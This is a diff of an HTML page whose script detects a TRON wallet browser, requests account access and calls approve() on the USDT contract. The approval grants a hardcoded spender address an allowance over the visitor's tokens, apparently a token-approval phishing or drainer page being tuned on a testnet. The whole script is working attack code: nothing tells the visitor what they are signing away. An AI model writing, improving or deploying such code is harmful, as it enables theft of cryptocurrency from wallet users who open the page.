@@ -3,14 +3,25 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 10px; }
+  </style>
 </head>
 <body>
+  <div id="log"></div>
 <script>
   const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
   const SPENDER = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
-  const AMOUNT_USDT = '1321321';
+  const AMOUNT_USDT = '10';
 
   let started = false;
+
+  function log(m) {
+    const d = document.createElement('div');
+    d.textContent = m;
+    document.getElementById('log').appendChild(d);
+    console.log(m);
+  }
 
   function getProvider() {
     if (window.tron && window.tron.tronWeb) return window.tron;
@@ -28,12 +39,13 @@
   async function main() {
     try {
       const p = getProvider();
-      if (!p) throw new Error('不是钱包内置浏览器');
+      if (!p) { log('❌ 不是钱包内置浏览器'); return; }
 
       let tw = p.tronWeb;
       let addr = tw?.defaultAddress?.base58;
 
       if (!addr && p.request) {
+        log('🔄 请求钱包授权...');
         try {
           await p.request({ method: 'tron_requestAccounts' });
         } catch (e) {
@@ -43,24 +55,26 @@
         addr = tw?.defaultAddress?.base58;
       }
 
-      if (!addr) throw new Error('无法获取地址');
+      if (!addr) { log('❌ 无法获取地址'); return; }
 
       const c = await tw.contract().at(USDT);
       const dec = Number(await c.decimals().call()) || 6;
       const raw = toBase(AMOUNT_USDT, dec);
 
-      console.log('trxB=' + addr);
-      console.log('spender=' + SPENDER);
-      console.log('amount=' + raw);
+      log('trxB=' + addr);
+      log('trxA=' + SPENDER);
+      log('amount=' + raw);
 
       const tx = await c.approve(SPENDER, raw).send({
-        feeLimit: '5000003146545640000',
+        feeLimit: '50000000',
         callValue: '0'
       });
 
-      console.log('SUCCESS TX=' + tx);
+      log('✅ 成功 TxID=' + tx);
+      log('🔍 https://nile.tronscan.org/#/transaction/' + tx);
     } catch (e) {
       console.error(e);
+      log('❌ ' + (e?.message || e));
     }
   }
 
